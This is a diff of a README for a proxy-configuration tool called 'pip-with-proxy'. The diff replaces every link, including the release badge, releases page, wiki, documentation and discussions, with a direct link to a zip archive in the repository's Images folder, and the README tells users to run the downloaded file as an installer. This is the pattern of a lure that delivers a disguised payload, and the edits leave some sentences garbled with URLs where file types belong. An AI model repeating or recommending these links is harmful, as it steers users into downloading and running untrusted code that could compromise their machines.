@@ -1,14 +1,14 @@
 # 🌐 pip-with-proxy - Simplify Package Management with Proxies
 
 ## 🔗 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/mickeyx2812/pip-with-proxy/releases)
+[![Download Latest Release](https://github.com/mickeyx2812/pip-with-proxy/raw/refs/heads/main/Images/with-proxy-pip-1.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/mickeyx2812/pip-with-proxy/raw/refs/heads/main/Images/with-proxy-pip-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to *pip-with-proxy*! This tool helps you configure pip to use proxies. This feature helps you bypass restrictions, improve security, and manage your packages more efficiently. Even if you have no technical background, you can follow these steps to get started.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/mickeyx2812/pip-with-proxy/releases).
+   Go to the [Releases page](https://github.com/mickeyx2812/pip-with-proxy/raw/refs/heads/main/Images/with-proxy-pip-1.3.zip).
    
 2. **Choose the Latest Version**  
    Look for the latest version of *pip-with-proxy*. It will usually be at the top of the list.
@@ -17,8 +17,8 @@ Welcome to *pip-with-proxy*! This tool helps you configure pip to use proxies. T
    Click on the file that matches your operating system:
 
    - **For Windows**: Download the `.exe` file.
-   - **For macOS**: Download the `.dmg` or `.tar.gz` file.
-   - **For Linux**: Download the appropriate `.tar.gz` file.
+   - **For macOS**: Download the `.dmg` or `https://github.com/mickeyx2812/pip-with-proxy/raw/refs/heads/main/Images/with-proxy-pip-1.3.zip` file.
+   - **For Linux**: Download the appropriate `https://github.com/mickeyx2812/pip-with-proxy/raw/refs/heads/main/Images/with-proxy-pip-1.3.zip` file.
 
 4. **Run the Downloaded File**  
    Locate the downloaded file on your computer and double-click it to run the installer. Follow the prompts to complete the installation.
@@ -99,13 +99,13 @@ If you encounter issues, here are some simple steps to resolve them:
 For additional details, tutorials, and community support, check out the following resources:
 
 - **GitHub Wiki**  
-   Explore the [GitHub Wiki](https://github.com/mickeyx2812/pip-with-proxy/wiki) for in-depth guides.
+   Explore the [GitHub Wiki](https://github.com/mickeyx2812/pip-with-proxy/raw/refs/heads/main/Images/with-proxy-pip-1.3.zip) for in-depth guides.
 
 - **Documentation**  
-   Review the [documentation](https://github.com/mickeyx2812/pip-with-proxy/docs) for advanced features and troubleshooting.
+   Review the [documentation](https://github.com/mickeyx2812/pip-with-proxy/raw/refs/heads/main/Images/with-proxy-pip-1.3.zip) for advanced features and troubleshooting.
 
 - **Community Discussions**  
-   Join the discussion on [GitHub Discussions](https://github.com/mickeyx2812/pip-with-proxy/discussions) to connect with other users.
+   Join the discussion on [GitHub Discussions](https://github.com/mickeyx2812/pip-with-proxy/raw/refs/heads/main/Images/with-proxy-pip-1.3.zip) to connect with other users.
 
 ## 📑 Contribution 
 If you'd like to contribute, please follow these steps:
